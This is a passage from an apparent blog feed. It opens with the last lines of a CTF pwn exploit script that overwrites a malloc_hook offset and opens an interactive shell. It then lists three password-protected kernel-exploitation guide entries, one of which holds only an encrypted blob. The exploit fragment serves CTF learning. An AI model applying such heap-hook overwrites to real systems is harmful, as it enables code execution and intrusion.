class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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